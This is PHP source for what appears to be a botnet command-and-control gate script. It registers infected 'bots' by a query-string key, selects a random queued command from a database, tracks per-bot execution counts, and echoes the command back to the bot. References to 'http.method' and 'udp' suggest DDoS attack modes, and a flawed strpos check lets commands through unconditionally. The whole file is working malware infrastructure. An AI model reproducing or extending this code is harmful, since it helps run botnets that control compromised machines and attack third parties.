<?
include_once('stat.php');
include_once('modules/bot.php');
include_once('modules/config/config.php');
include_once('modules/security.php');

$sec = new Security('activation');
$stat = new Stats('activation');
$key = array();

if(isset($_GET['key'])):


	$k = $_SERVER['QUERY_STRING'];
	$k = str_replace('key=', '', $k);
	$user = new Bot($k);
	$cmdarr = array();
	
	if($user->result == true):
	
		$user->AddUser();
		$idbot = $user->GetBotID();
		$cmdarr = $user->SelectAllCommand();

		if(count($cmdarr) > 0):		
		
				$key = array_rand($cmdarr, 1);
				$cmdid = intval($cmdarr[$key]['id']);
				$amount = intval($cmdarr[$key]['amount']);
				$forid = intval($cmdarr[$key]['forid']);
				$cmdtext = $cmdarr[$key]['cmd'];
				
				if($amount > 0):
					if($user->isMarked($idbot, $cmdid)==false):
						$user->DoneUp($cmdid);
						$user->MarkSet($idbot, $cmdid);
						echo $cmdtext;
					else: $sec->NotFound(); endif;
				endif;
				
				if ((strpos('http.method', $cmdtext) !== true) or (strpos('udp', $cmdtext) !== true)):	
						echo $cmdtext; 
				
				else: $sec->NotFound(); endif;
			else: $sec->NotFound(); endif;
		else: $sec->NotFound(); endif;
	else:  $sec->NotFound(); endif;
	

?>